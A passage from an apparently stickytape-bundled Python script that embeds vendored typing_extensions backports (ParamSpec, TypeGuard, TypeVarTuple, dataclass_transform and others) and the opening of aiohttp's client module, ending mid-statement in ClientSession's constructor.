ParamSpecKwargs objects have a reference back to their ParamSpec:\n\n        P.kwargs.__origin__ is P\n\n        This type is meant for runtime introspection and has no special meaning to\n        static type checkers.\n        """\n        def __init__(self, origin):\n            self.__origin__ = origin\n\n        def __repr__(self):\n            return f"{self.__origin__.__name__}.kwargs"\n\n        def __eq__(self, other):\n            if not isinstance(other, ParamSpecKwargs):\n                return NotImplemented\n            return self.__origin__ == other.__origin__\n\n# 3.10+\nif hasattr(typing, \'ParamSpec\'):\n    ParamSpec = typing.ParamSpec\n# 3.7-3.9\nelse:\n\n    # Inherits from list as a workaround for Callable checks in Python < 3.9.2.\n    class ParamSpec(list):\n        """Parameter specification variable.\n\n        Usage::\n\n           P = ParamSpec(\'P\')\n\n        Parameter specification variables exist primarily for the benefit of static\n        type checkers.  They are used to forward the parameter types of one\n        callable to another callable, a pattern commonly found in higher order\n        functions and decorators.  They are only valid when used in ``Concatenate``,\n        or s the first argument to ``Callable``. In Python 3.10 and higher,\n        they are also supported in user-defined Generics at runtime.\n        See class Generic for more information on generic types.  An\n        example for annotating a decorator::\n\n           T = TypeVar(\'T\')\n           P = ParamSpec(\'P\')\n\n           def add_logging(f: Callable[P, T]) -> Callable[P, T]:\n               \'\'\'A type-safe decorator to add logging to a function.\'\'\'\n               def inner(*args: P.args, **kwargs: P.kwargs) -> T:\n                   logging.info(f\'{f.__name__} was called\')\n                   return f(*args, **kwargs)\n               return inner\n\n           @add_logging\n           def add_two(x: float, y: float) -> float:\n               \'\'\'Add two numbers together.\'\'\'\n               return x + y\n\n        Parameter specification variables defined with covariant=True or\n        contravariant=True can be used to declare covariant or contravariant\n        generic types.  These keyword arguments are valid, but their actual semantics\n        are yet to be decided.  See PEP 612 for details.\n\n        Parameter specification variables can be introspected. e.g.:\n\n           P.__name__ == \'T\'\n           P.__bound__ == None\n           P.__covariant__ == False\n           P.__contravariant__ == False\n\n        Note that only parameter specification variables defined in global scope can\n        be pickled.\n        """\n\n        # Trick Generic __parameters__.\n        __class__ = typing.TypeVar\n\n        @property\n        def args(self):\n            return ParamSpecArgs(self)\n\n        @property\n        def kwargs(self):\n            return ParamSpecKwargs(self)\n\n        def __init__(self, name, *, bound=None, covariant=False, contravariant=False):\n            super().__init__([self])\n            self.__name__ = name\n            self.__covariant__ = bool(covariant)\n            self.__contravariant__ = bool(contravariant)\n            if bound:\n                self.__bound__ = typing._type_check(bound, \'Bound must be a type.\')\n            else:\n                self.__bound__ = None\n\n            # for pickling:\n            try:\n                def_mod = sys._getframe(1).f_globals.get(\'__name__\', \'__main__\')\n            except (AttributeError, ValueError):\n                def_mod = None\n            if def_mod != \'typing_extensions\':\n                self.__module__ = def_mod\n\n        def __repr__(self):\n            if self.__covariant__:\n                prefix = \'+\'\n            elif self.__contravariant__:\n                prefix = \'-\'\n            else:\n                prefix = \'~\'\n            return prefix + self.__name__\n\n        def __hash__(self):\n            return object.__hash__(self)\n\n        def __eq__(self, other):\n            return self is other\n\n        def __reduce__(self):\n            return self.__name__\n\n        # Hack to get typing._type_check to pass.\n        def __call__(self, *args, **kwargs):\n            pass\n\n\n# 3.7-3.9\nif not hasattr(typing, \'Concatenate\'):\n    # Inherits from list as a workaround for Callable checks in Python < 3.9.2.\n    class _ConcatenateGenericAlias(list):\n\n        # Trick Generic into looking into this for __parameters__.\n        __class__ = typing._GenericAlias\n\n        # Flag in 3.8.\n        _special = False\n\n        def __init__(self, origin, args):\n            super().__init__(args)\n            self.__origin__ = origin\n            self.__args__ = args\n\n        def __repr__(self):\n            _type_repr = typing._type_repr\n            return (f\'{_type_repr(self.__origin__)}\'\n                    f\'[{", ".join(_type_repr(arg) for arg in self.__args__)}]\')\n\n        def __hash__(self):\n            return hash((self.__origin__, self.__args__))\n\n        # Hack to get typing._type_check to pass in Generic.\n        def __call__(self, *args, **kwargs):\n            pass\n\n        @property\n        def __parameters__(self):\n            return tuple(\n                tp for tp in self.__args__ if isinstance(tp, (typing.TypeVar, ParamSpec))\n            )\n\n\n# 3.7-3.9\n@typing._tp_cache\ndef _concatenate_getitem(self, parameters):\n    if parameters == ():\n        raise TypeError("Cannot take a Concatenate of no types.")\n    if not isinstance(parameters, tuple):\n        parameters = (parameters,)\n    if not isinstance(parameters[-1], ParamSpec):\n        raise TypeError("The last parameter to Concatenate should be a "\n                        "ParamSpec variable.")\n    msg = "Concatenate[arg, ...]: each arg must be a type."\n    parameters = tuple(typing._type_check(p, msg) for p in parameters)\n    return _ConcatenateGenericAlias(self, parameters)\n\n\n# 3.10+\nif hasattr(typing, \'Concatenate\'):\n    Concatenate = typing.Concatenate\n    _ConcatenateGenericAlias = typing._ConcatenateGenericAlias # noqa\n# 3.9\nelif sys.version_info[:2] >= (3, 9):\n    @_TypeAliasForm\n    def Concatenate(self, parameters):\n        """Used in conjunction with ``ParamSpec`` and ``Callable`` to represent a\n        higher order function which adds, removes or transforms parameters of a\n        callable.\n\n        For example::\n\n           Callable[Concatenate[int, P], int]\n\n        See PEP 612 for detailed information.\n        """\n        return _concatenate_getitem(self, parameters)\n# 3.7-8\nelse:\n    class _ConcatenateForm(typing._SpecialForm, _root=True):\n        def __repr__(self):\n            return \'typing_extensions.\' + self._name\n\n        def __getitem__(self, parameters):\n            return _concatenate_getitem(self, parameters)\n\n    Concatenate = _ConcatenateForm(\n        \'Concatenate\',\n        doc="""Used in conjunction with ``ParamSpec`` and ``Callable`` to represent a\n        higher order function which adds, removes or transforms parameters of a\n        callable.\n\n        For example::\n\n           Callable[Concatenate[int, P], int]\n\n        See PEP 612 for detailed information.\n        """)\n\n# 3.10+\nif hasattr(typing, \'TypeGuard\'):\n    TypeGuard = typing.TypeGuard\n# 3.9\nelif sys.version_info[:2] >= (3, 9):\n    class _TypeGuardForm(typing._SpecialForm, _root=True):\n        def __repr__(self):\n            return \'typing_extensions.\' + self._name\n\n    @_TypeGuardForm\n    def TypeGuard(self, parameters):\n        """Special typing form used to annotate the return type of a user-defined\n        type guard function.  ``TypeGuard`` only accepts a single type argument.\n        At runtime, functions marked this way should return a boolean.\n\n        ``TypeGuard`` aims to benefit *type narrowing* -- a technique used by static\n        type checkers to determine a more precise type of an expression within a\n        program\'s code flow.  Usually type narrowing is done by analyzing\n        conditional code flow and applying the narrowing to a block of code.  The\n        conditional expression here is sometimes referred to as a "type guard".\n\n        Sometimes it would be convenient to use a user-defined boolean function\n        as a type guard.  Such a function should use ``TypeGuard[...]`` as its\n        return type to alert static type checkers to this intention.\n\n        Using  ``-> TypeGuard`` tells the static type checker that for a given\n        function:\n\n        1. The return value is a boolean.\n        2. If the return value is ``True``, the type of its argument\n        is the type inside ``TypeGuard``.\n\n        For example::\n\n            def is_str(val: Union[str, float]):\n                # "isinstance" type guard\n                if isinstance(val, str):\n                    # Type of ``val`` is narrowed to ``str``\n                    ...\n                else:\n                    # Else, type of ``val`` is narrowed to ``float``.\n                    ...\n\n        Strict type narrowing is not enforced -- ``TypeB`` need not be a narrower\n        form of ``TypeA`` (it can even be a wider form) and this may lead to\n        type-unsafe results.  The main reason is to allow for things like\n        narrowing ``List[object]`` to ``List[str]`` even though the latter is not\n        a subtype of the former, since ``List`` is invariant.  The responsibility of\n        writing type-safe type guards is left to the user.\n\n        ``TypeGuard`` also works with type variables.  For more information, see\n        PEP 647 (User-Defined Type Guards).\n        """\n        item = typing._type_check(parameters, f\'{self} accepts only a single type.\')\n        return typing._GenericAlias(self, (item,))\n# 3.7-3.8\nelse:\n    class _TypeGuardForm(typing._SpecialForm, _root=True):\n\n        def __repr__(self):\n            return \'typing_extensions.\' + self._name\n\n        def __getitem__(self, parameters):\n            item = typing._type_check(parameters,\n                                      f\'{self._name} accepts only a single type\')\n            return typing._GenericAlias(self, (item,))\n\n    TypeGuard = _TypeGuardForm(\n        \'TypeGuard\',\n        doc="""Special typing form used to annotate the return type of a user-defined\n        type guard function.  ``TypeGuard`` only accepts a single type argument.\n        At runtime, functions marked this way should return a boolean.\n\n        ``TypeGuard`` aims to benefit *type narrowing* -- a technique used by static\n        type checkers to determine a more precise type of an expression within a\n        program\'s code flow.  Usually type narrowing is done by analyzing\n        conditional code flow and applying the narrowing to a block of code.  The\n        conditional expression here is sometimes referred to as a "type guard".\n\n        Sometimes it would be convenient to use a user-defined boolean function\n        as a type guard.  Such a function should use ``TypeGuard[...]`` as its\n        return type to alert static type checkers to this intention.\n\n        Using  ``-> TypeGuard`` tells the static type checker that for a given\n        function:\n\n        1. The return value is a boolean.\n        2. If the return value is ``True``, the type of its argument\n        is the type inside ``TypeGuard``.\n\n        For example::\n\n            def is_str(val: Union[str, float]):\n                # "isinstance" type guard\n                if isinstance(val, str):\n                    # Type of ``val`` is narrowed to ``str``\n                    ...\n                else:\n                    # Else, type of ``val`` is narrowed to ``float``.\n                    ...\n\n        Strict type narrowing is not enforced -- ``TypeB`` need not be a narrower\n        form of ``TypeA`` (it can even be a wider form) and this may lead to\n        type-unsafe results.  The main reason is to allow for things like\n        narrowing ``List[object]`` to ``List[str]`` even though the latter is not\n        a subtype of the former, since ``List`` is invariant.  The responsibility of\n        writing type-safe type guards is left to the user.\n\n        ``TypeGuard`` also works with type variables.  For more information, see\n        PEP 647 (User-Defined Type Guards).\n        """)\n\n\n# Vendored from cpython typing._SpecialFrom\nclass _SpecialForm(typing._Final, _root=True):\n    __slots__ = (\'_name\', \'__doc__\', \'_getitem\')\n\n    def __init__(self, getitem):\n        self._getitem = getitem\n        self._name = getitem.__name__\n        self.__doc__ = getitem.__doc__\n\n    def __getattr__(self, item):\n        if item in {\'__name__\', \'__qualname__\'}:\n            return self._name\n\n        raise AttributeError(item)\n\n    def __mro_entries__(self, bases):\n        raise TypeError(f"Cannot subclass {self!r}")\n\n    def __repr__(self):\n        return f\'typing_extensions.{self._name}\'\n\n    def __reduce__(self):\n        return self._name\n\n    def __call__(self, *args, **kwds):\n        raise TypeError(f"Cannot instantiate {self!r}")\n\n    def __or__(self, other):\n        return typing.Union[self, other]\n\n    def __ror__(self, other):\n        return typing.Union[other, self]\n\n    def __instancecheck__(self, obj):\n        raise TypeError(f"{self} cannot be used with isinstance()")\n\n    def __subclasscheck__(self, cls):\n        raise TypeError(f"{self} cannot be used with issubclass()")\n\n    @typing._tp_cache\n    def __getitem__(self, parameters):\n        return self._getitem(self, parameters)\n\n\nif hasattr(typing, "LiteralString"):\n    LiteralString = typing.LiteralString\nelse:\n    @_SpecialForm\n    def LiteralString(self, params):\n        """Represents an arbitrary literal string.\n\n        Example::\n\n          from typing_extensions import LiteralString\n\n          def query(sql: LiteralString) -> ...:\n              ...\n\n          query("SELECT * FROM table")  # ok\n          query(f"SELECT * FROM {input()}")  # not ok\n\n        See PEP 675 for details.\n\n        """\n        raise TypeError(f"{self} is not subscriptable")\n\n\nif hasattr(typing, "Self"):\n    Self = typing.Self\nelse:\n    @_SpecialForm\n    def Self(self, params):\n        """Used to spell the type of "self" in classes.\n\n        Example::\n\n          from typing import Self\n\n          class ReturnsSelf:\n              def parse(self, data: bytes) -> Self:\n                  ...\n                  return self\n\n        """\n\n        raise TypeError(f"{self} is not subscriptable")\n\n\nif hasattr(typing, "Never"):\n    Never = typing.Never\nelse:\n    @_SpecialForm\n    def Never(self, params):\n        """The bottom type, a type that has no members.\n\n        This can be used to define a function that should never be\n        called, or a function that never returns::\n\n            from typing_extensions import Never\n\n            def never_call_me(arg: Never) -> None:\n                pass\n\n            def int_or_str(arg: int | str) -> None:\n                never_call_me(arg)  # type checker error\n                match arg:\n                    case int():\n                        print("It\'s an int")\n                    case str():\n                        print("It\'s a str")\n                    case _:\n                        never_call_me(arg)  # ok, arg is of type Never\n\n        """\n\n        raise TypeError(f"{self} is not subscriptable")\n\n\nif hasattr(typing, \'Required\'):\n    Required = typing.Required\n    NotRequired = typing.NotRequired\nelif sys.version_info[:2] >= (3, 9):\n    class _ExtensionsSpecialForm(typing._SpecialForm, _root=True):\n        def __repr__(self):\n            return \'typing_extensions.\' + self._name\n\n    @_ExtensionsSpecialForm\n    def Required(self, parameters):\n        """A special typing construct to mark a key of a total=False TypedDict\n        as required. For example:\n\n            class Movie(TypedDict, total=False):\n                title: Required[str]\n                year: int\n\n            m = Movie(\n                title=\'The Matrix\',  # typechecker error if key is omitted\n                year=1999,\n            )\n\n        There is no runtime checking that a required key is actually provided\n        when instantiating a related TypedDict.\n        """\n        item = typing._type_check(parameters, f\'{self._name} accepts only a single type.\')\n        return typing._GenericAlias(self, (item,))\n\n    @_ExtensionsSpecialForm\n    def NotRequired(self, parameters):\n        """A special typing construct to mark a key of a TypedDict as\n        potentially missing. For example:\n\n            class Movie(TypedDict):\n                title: str\n                year: NotRequired[int]\n\n            m = Movie(\n                title=\'The Matrix\',  # typechecker error if key is omitted\n                year=1999,\n            )\n        """\n        item = typing._type_check(parameters, f\'{self._name} accepts only a single type.\')\n        return typing._GenericAlias(self, (item,))\n\nelse:\n    class _RequiredForm(typing._SpecialForm, _root=True):\n        def __repr__(self):\n            return \'typing_extensions.\' + self._name\n\n        def __getitem__(self, parameters):\n            item = typing._type_check(parameters,\n                                      f\'{self._name} accepts only a single type.\')\n            return typing._GenericAlias(self, (item,))\n\n    Required = _RequiredForm(\n        \'Required\',\n        doc="""A special typing construct to mark a key of a total=False TypedDict\n        as required. For example:\n\n            class Movie(TypedDict, total=False):\n                title: Required[str]\n                year: int\n\n            m = Movie(\n                title=\'The Matrix\',  # typechecker error if key is omitted\n                year=1999,\n            )\n\n        There is no runtime checking that a required key is actually provided\n        when instantiating a related TypedDict.\n        """)\n    NotRequired = _RequiredForm(\n        \'NotRequired\',\n        doc="""A special typing construct to mark a key of a TypedDict as\n        potentially missing. For example:\n\n            class Movie(TypedDict):\n                title: str\n                year: NotRequired[int]\n\n            m = Movie(\n                title=\'The Matrix\',  # typechecker error if key is omitted\n                year=1999,\n            )\n        """)\n\n\nif hasattr(typing, "Unpack"):  # 3.11+\n    Unpack = typing.Unpack\nelif sys.version_info[:2] >= (3, 9):\n    class _UnpackSpecialForm(typing._SpecialForm, _root=True):\n        def __repr__(self):\n            return \'typing_extensions.\' + self._name\n\n    class _UnpackAlias(typing._GenericAlias, _root=True):\n        __class__ = typing.TypeVar\n\n    @_UnpackSpecialForm\n    def Unpack(self, parameters):\n        """A special typing construct to unpack a variadic type. For example:\n\n            Shape = TypeVarTuple(\'Shape\')\n            Batch = NewType(\'Batch\', int)\n\n            def add_batch_axis(\n                x: Array[Unpack[Shape]]\n            ) -> Array[Batch, Unpack[Shape]]: ...\n\n        """\n        item = typing._type_check(parameters, f\'{self._name} accepts only a single type.\')\n        return _UnpackAlias(self, (item,))\n\n    def _is_unpack(obj):\n        return isinstance(obj, _UnpackAlias)\n\nelse:\n    class _UnpackAlias(typing._GenericAlias, _root=True):\n        __class__ = typing.TypeVar\n\n    class _UnpackForm(typing._SpecialForm, _root=True):\n        def __repr__(self):\n            return \'typing_extensions.\' + self._name\n\n        def __getitem__(self, parameters):\n            item = typing._type_check(parameters,\n                                      f\'{self._name} accepts only a single type.\')\n            return _UnpackAlias(self, (item,))\n\n    Unpack = _UnpackForm(\n        \'Unpack\',\n        doc="""A special typing construct to unpack a variadic type. For example:\n\n            Shape = TypeVarTuple(\'Shape\')\n            Batch = NewType(\'Batch\', int)\n\n            def add_batch_axis(\n                x: Array[Unpack[Shape]]\n            ) -> Array[Batch, Unpack[Shape]]: ...\n\n        """)\n\n    def _is_unpack(obj):\n        return isinstance(obj, _UnpackAlias)\n\n\nif hasattr(typing, "TypeVarTuple"):  # 3.11+\n    TypeVarTuple = typing.TypeVarTuple\nelse:\n    class TypeVarTuple:\n        """Type variable tuple.\n\n        Usage::\n\n            Ts = TypeVarTuple(\'Ts\')\n\n        In the same way that a normal type variable is a stand-in for a single\n        type such as ``int``, a type variable *tuple* is a stand-in for a *tuple*\n        type such as ``Tuple[int, str]``.\n\n        Type variable tuples can be used in ``Generic`` declarations.\n        Consider the following example::\n\n            class Array(Generic[*Ts]): ...\n\n        The ``Ts`` type variable tuple here behaves like ``tuple[T1, T2]``,\n        where ``T1`` and ``T2`` are type variables. To use these type variables\n        as type parameters of ``Array``, we must *unpack* the type variable tuple using\n        the star operator: ``*Ts``. The signature of ``Array`` then behaves\n        as if we had simply written ``class Array(Generic[T1, T2]): ...``.\n        In contrast to ``Generic[T1, T2]``, however, ``Generic[*Shape]`` allows\n        us to parameterise the class with an *arbitrary* number of type parameters.\n\n        Type variable tuples can be used anywhere a normal ``TypeVar`` can.\n        This includes class definitions, as shown above, as well as function\n        signatures and variable annotations::\n\n            class Array(Generic[*Ts]):\n\n                def __init__(self, shape: Tuple[*Ts]):\n                    self._shape: Tuple[*Ts] = shape\n\n                def get_shape(self) -> Tuple[*Ts]:\n                    return self._shape\n\n            shape = (Height(480), Width(640))\n            x: Array[Height, Width] = Array(shape)\n            y = abs(x)  # Inferred type is Array[Height, Width]\n            z = x + x   #        ...    is Array[Height, Width]\n            x.get_shape()  #     ...    is tuple[Height, Width]\n\n        """\n\n        # Trick Generic __parameters__.\n        __class__ = typing.TypeVar\n\n        def __iter__(self):\n            yield self.__unpacked__\n\n        def __init__(self, name):\n            self.__name__ = name\n\n            # for pickling:\n            try:\n                def_mod = sys._getframe(1).f_globals.get(\'__name__\', \'__main__\')\n            except (AttributeError, ValueError):\n                def_mod = None\n            if def_mod != \'typing_extensions\':\n                self.__module__ = def_mod\n\n            self.__unpacked__ = Unpack[self]\n\n        def __repr__(self):\n            return self.__name__\n\n        def __hash__(self):\n            return object.__hash__(self)\n\n        def __eq__(self, other):\n            return self is other\n\n        def __reduce__(self):\n            return self.__name__\n\n        def __init_subclass__(self, *args, **kwds):\n            if \'_root\' not in kwds:\n                raise TypeError("Cannot subclass special typing classes")\n\n\nif hasattr(typing, "reveal_type"):\n    reveal_type = typing.reveal_type\nelse:\n    def reveal_type(__obj: T) -> T:\n        """Reveal the inferred type of a variable.\n\n        When a static type checker encounters a call to ``reveal_type()``,\n        it will emit the inferred type of the argument::\n\n            x: int = 1\n            reveal_type(x)\n\n        Running a static type checker (e.g., ``mypy``) on this example\n        will produce output similar to \'Revealed type is "builtins.int"\'.\n\n        At runtime, the function prints the runtime type of the\n        argument and returns it unchanged.\n\n        """\n        print(f"Runtime type is {type(__obj).__name__!r}", file=sys.stderr)\n        return __obj\n\n\nif hasattr(typing, "assert_never"):\n    assert_never = typing.assert_never\nelse:\n    def assert_never(__arg: Never) -> Never:\n        """Assert to the type checker that a line of code is unreachable.\n\n        Example::\n\n            def int_or_str(arg: int | str) -> None:\n                match arg:\n                    case int():\n                        print("It\'s an int")\n                    case str():\n                        print("It\'s a str")\n                    case _:\n                        assert_never(arg)\n\n        If a type checker finds that a call to assert_never() is\n        reachable, it will emit an error.\n\n        At runtime, this throws an exception when called.\n\n        """\n        raise AssertionError("Expected code to be unreachable")\n\n\nif hasattr(typing, \'dataclass_transform\'):\n    dataclass_transform = typing.dataclass_transform\nelse:\n    def dataclass_transform(\n        *,\n        eq_default: bool = True,\n        order_default: bool = False,\n        kw_only_default: bool = False,\n        field_specifiers: typing.Tuple[\n            typing.Union[typing.Type[typing.Any], typing.Callable[..., typing.Any]],\n            ...\n        ] = (),\n        **kwargs: typing.Any,\n    ) -> typing.Callable[[T], T]:\n        """Decorator that marks a function, class, or metaclass as providing\n        dataclass-like behavior.\n\n        Example:\n\n            from typing_extensions import dataclass_transform\n\n            _T = TypeVar("_T")\n\n            # Used on a decorator function\n            @dataclass_transform()\n            def create_model(cls: type[_T]) -> type[_T]:\n                ...\n                return cls\n\n            @create_model\n            class CustomerModel:\n                id: int\n                name: str\n\n            # Used on a base class\n            @dataclass_transform()\n            class ModelBase: ...\n\n            class CustomerModel(ModelBase):\n                id: int\n                name: str\n\n            # Used on a metaclass\n            @dataclass_transform()\n            class ModelMeta(type): ...\n\n            class ModelBase(metaclass=ModelMeta): ...\n\n            class CustomerModel(ModelBase):\n                id: int\n                name: str\n\n        Each of the ``CustomerModel`` classes defined in this example will now\n        behave similarly to a dataclass created with the ``@dataclasses.dataclass``\n        decorator. For example, the type checker will synthesize an ``__init__``\n        method.\n\n        The arguments to this decorator can be used to customize this behavior:\n        - ``eq_default`` indicates whether the ``eq`` parameter is assumed to be\n          True or False if it is omitted by the caller.\n        - ``order_default`` indicates whether the ``order`` parameter is\n          assumed to be True or False if it is omitted by the caller.\n        - ``kw_only_default`` indicates whether the ``kw_only`` parameter is\n          assumed to be True or False if it is omitted by the caller.\n        - ``field_specifiers`` specifies a static list of supported classes\n          or functions that describe fields, similar to ``dataclasses.field()``.\n\n        At runtime, this decorator records its arguments in the\n        ``__dataclass_transform__`` attribute on the decorated object.\n\n        See PEP 681 for details.\n\n        """\n        def decorator(cls_or_fn):\n            cls_or_fn.__dataclass_transform__ = {\n                "eq_default": eq_default,\n                "order_default": order_default,\n                "kw_only_default": kw_only_default,\n                "field_specifiers": field_specifiers,\n                "kwargs": kwargs,\n            }\n            return cls_or_fn\n        return decorator\n\n\n# We have to do some monkey patching to deal with the dual nature of\n# Unpack/TypeVarTuple:\n# - We want Unpack to be a kind of TypeVar so it gets accepted in\n#   Generic[Unpack[Ts]]\n# - We want it to *not* be treated as a TypeVar for the purposes of\n#   counting generic parameters, so that when we subscript a generic,\n#   the runtime doesn\'t try to substitute the Unpack with the subscripted type.\nif not hasattr(typing, "TypeVarTuple"):\n    typing._collect_type_vars = _collect_type_vars\n    typing._check_generic = _check_generic\n')
    __stickytape_write_module('aiohttp/client.py', b'"""HTTP Client for asyncio."""\r\n\r\nimport asyncio\r\nimport base64\r\nimport hashlib\r\nimport json\r\nimport os\r\nimport sys\r\nimport traceback\r\nimport warnings\r\nfrom contextlib import suppress\r\nfrom types import SimpleNamespace, TracebackType\r\nfrom typing import (\r\n    Any,\r\n    Awaitable,\r\n    Callable,\r\n    Coroutine,\r\n    FrozenSet,\r\n    Generator,\r\n    Generic,\r\n    Iterable,\r\n    List,\r\n    Mapping,\r\n    Optional,\r\n    Set,\r\n    Tuple,\r\n    Type,\r\n    TypeVar,\r\n    Union,\r\n)\r\n\r\nimport attr\r\nfrom multidict import CIMultiDict, MultiDict, MultiDictProxy, istr\r\nfrom yarl import URL\r\n\r\nfrom . import hdrs, http, payload\r\nfrom .abc import AbstractCookieJar\r\nfrom .client_exceptions import (\r\n    ClientConnectionError as ClientConnectionError,\r\n    ClientConnectorCertificateError as ClientConnectorCertificateError,\r\n    ClientConnectorError as ClientConnectorError,\r\n    ClientConnectorSSLError as ClientConnectorSSLError,\r\n    ClientError as ClientError,\r\n    ClientHttpProxyError as ClientHttpProxyError,\r\n    ClientOSError as ClientOSError,\r\n    ClientPayloadError as ClientPayloadError,\r\n    ClientProxyConnectionError as ClientProxyConnectionError,\r\n    ClientResponseError as ClientResponseError,\r\n    ClientSSLError as ClientSSLError,\r\n    ContentTypeError as ContentTypeError,\r\n    InvalidURL as InvalidURL,\r\n    ServerConnectionError as ServerConnectionError,\r\n    ServerDisconnectedError as ServerDisconnectedError,\r\n    ServerFingerprintMismatch as ServerFingerprintMismatch,\r\n    ServerTimeoutError as ServerTimeoutError,\r\n    TooManyRedirects as TooManyRedirects,\r\n    WSServerHandshakeError as WSServerHandshakeError,\r\n)\r\nfrom .client_reqrep import (\r\n    ClientRequest as ClientRequest,\r\n    ClientResponse as ClientResponse,\r\n    Fingerprint as Fingerprint,\r\n    RequestInfo as RequestInfo,\r\n    _merge_ssl_params,\r\n)\r\nfrom .client_ws import ClientWebSocketResponse as ClientWebSocketResponse\r\nfrom .connector import (\r\n    BaseConnector as BaseConnector,\r\n    NamedPipeConnector as NamedPipeConnector,\r\n    TCPConnector as TCPConnector,\r\n    UnixConnector as UnixConnector,\r\n)\r\nfrom .cookiejar import CookieJar\r\nfrom .helpers import (\r\n    DEBUG,\r\n    PY_36,\r\n    BasicAuth,\r\n    TimeoutHandle,\r\n    ceil_timeout,\r\n    get_env_proxy_for_url,\r\n    get_running_loop,\r\n    sentinel,\r\n    strip_auth_from_url,\r\n)\r\nfrom .http import WS_KEY, HttpVersion, WebSocketReader, WebSocketWriter\r\nfrom .http_websocket import WSHandshakeError, WSMessage, ws_ext_gen, ws_ext_parse\r\nfrom .streams import FlowControlDataQueue\r\nfrom .tracing import Trace, TraceConfig\r\nfrom .typedefs import Final, JSONEncoder, LooseCookies, LooseHeaders, StrOrURL\r\n\r\n__all__ = (\r\n    # client_exceptions\r\n    "ClientConnectionError",\r\n    "ClientConnectorCertificateError",\r\n    "ClientConnectorError",\r\n    "ClientConnectorSSLError",\r\n    "ClientError",\r\n    "ClientHttpProxyError",\r\n    "ClientOSError",\r\n    "ClientPayloadError",\r\n    "ClientProxyConnectionError",\r\n    "ClientResponseError",\r\n    "ClientSSLError",\r\n    "ContentTypeError",\r\n    "InvalidURL",\r\n    "ServerConnectionError",\r\n    "ServerDisconnectedError",\r\n    "ServerFingerprintMismatch",\r\n    "ServerTimeoutError",\r\n    "TooManyRedirects",\r\n    "WSServerHandshakeError",\r\n    # client_reqrep\r\n    "ClientRequest",\r\n    "ClientResponse",\r\n    "Fingerprint",\r\n    "RequestInfo",\r\n    # connector\r\n    "BaseConnector",\r\n    "TCPConnector",\r\n    "UnixConnector",\r\n    "NamedPipeConnector",\r\n    # client_ws\r\n    "ClientWebSocketResponse",\r\n    # client\r\n    "ClientSession",\r\n    "ClientTimeout",\r\n    "request",\r\n)\r\n\r\n\r\ntry:\r\n    from ssl import SSLContext\r\nexcept ImportError:  # pragma: no cover\r\n    SSLContext = object  # type: ignore[misc,assignment]\r\n\r\n\r\n@attr.s(auto_attribs=True, frozen=True, slots=True)\r\nclass ClientTimeout:\r\n    total: Optional[float] = None\r\n    connect: Optional[float] = None\r\n    sock_read: Optional[float] = None\r\n    sock_connect: Optional[float] = None\r\n\r\n    # pool_queue_timeout: Optional[float] = None\r\n    # dns_resolution_timeout: Optional[float] = None\r\n    # socket_connect_timeout: Optional[float] = None\r\n    # connection_acquiring_timeout: Optional[float] = None\r\n    # new_connection_timeout: Optional[float] = None\r\n    # http_header_timeout: Optional[float] = None\r\n    # response_body_timeout: Optional[float] = None\r\n\r\n    # to create a timeout specific for a single request, either\r\n    # - create a completely new one to overwrite the default\r\n    # - or use http://www.attrs.org/en/stable/api.html#attr.evolve\r\n    # to overwrite the defaults\r\n\r\n\r\n# 5 Minute default read timeout\r\nDEFAULT_TIMEOUT: Final[ClientTimeout] = ClientTimeout(total=5 * 60)\r\n\r\n_RetType = TypeVar("_RetType")\r\n\r\n\r\nclass ClientSession:\r\n    """First-class interface for making HTTP requests."""\r\n\r\n    ATTRS = frozenset(\r\n        [\r\n            "_base_url",\r\n            "_source_traceback",\r\n            "_connector",\r\n            "requote_redirect_url",\r\n            "_loop",\r\n            "_cookie_jar",\r\n            "_connector_owner",\r\n            "_default_auth",\r\n            "_version",\r\n            "_json_serialize",\r\n            "_requote_redirect_url",\r\n            "_timeout",\r\n            "_raise_for_status",\r\n            "_auto_decompress",\r\n            "_trust_env",\r\n            "_default_headers",\r\n            "_skip_auto_headers",\r\n            "_request_class",\r\n            "_response_class",\r\n            "_ws_response_class",\r\n            "_trace_configs",\r\n            "_read_bufsize",\r\n        ]\r\n    )\r\n\r\n    _source_traceback = None\r\n\r\n    def __init__(\r\n        self,\r\n        base_url: Optional[StrOrURL] = None,\r\n        *,\r\n        connector: Optional[BaseConnector] = None,\r\n        loop: Optional[asyncio.AbstractEventLoop] = None,\r\n        cookies: Optional[LooseCookies] = None,\r\n        headers: Optional[LooseHeaders] = None,\r\n        skip_auto_headers: Optional[Iterable[str]] = None,\r\n        auth: Optional[BasicAuth] = None,\r\n        json_serialize: JSONEncoder = json.dumps,\r\n        request_class: Type[ClientRequest] = ClientRequest,\r\n        response_class: Type[ClientResponse] = ClientResponse,\r\n        ws_response_class: Type[ClientWebSocketResponse] = ClientWebSocketResponse,\r\n        version: HttpVersion = http.HttpVersion11,\r\n        cookie_jar: Optional[AbstractCookieJar] = None,\r\n        connector_owner: bool = True,\r\n        raise_for_status: bool = False,\r\n        read_timeout: Union[float, object] = sentinel,\r\n        conn_timeout: Optional[float] = None,\r\n        timeout: Union[object, ClientTimeout] = sentinel,\r\n        auto_decompress: bool = True,\r\n        trust_env: bool = False,\r\n        requote_redirect_url: bool = True,\r\n        trace_configs: Optional[List[TraceConfig]] = None,\r\n        read_bufsize: int = 2 ** 16,\r\n    ) -> None:\r\n        if loop is None:\r\n            if connector is not None:\r\n                loop = connector._loop\r\n\r\n        loop = get_running_loop(loop)\r\n\r\n        if base_url is None or isinstance(base_url, URL):\r\n            self._base_url: Optional[URL] = base_url\r\n        else:\r\n            self._base_url = URL(base_url)\r\n            assert (\r\n                self._base_url.origin() == self._base_url\r\n            ), "Only absolute URLs without path part are supported"\r\n\r\n        if connector is None:\r\n            connector = TCPConnector(loop=loop)\r\n\r\n        if connector._loop is not loop:\r\n            raise RuntimeError("Session and connector has to use same event loop")\r\n\r\n        self._loop = loop\r\n\r\n        if loop.get_debug():\r\n            self._source_traceback = traceback.extract_stack(sys._getframe(1))\r\n\r\n        if cookie_jar is None:\r\n            cookie_jar = CookieJar(loop=loop)\r\n        self._cookie_jar = cookie_jar\r\n\r\n        if cookies is not None:\r\n            self._cookie_jar.update_cookies(cookies)\r\n\r\n        self._connector = connector  # type: Optional[BaseConnector]\r\n        self._connector_owner = connector_owner\r\n        self._default_auth = auth\r\n        self._version = version\r\n        self._json_serialize = json_serialize\r\n        if timeout is sentinel:\r\n            self._timeout = DEFAULT_TIMEOUT\r\n            if read_timeout is not sentinel:\r\n                warnings.warn(\r\n                    "read_timeout is deprecated, " "use timeout argument instead",\r\n                    DeprecationWarning,\r\n                    stacklevel=2,\r\n                )\r\n                self._timeout = 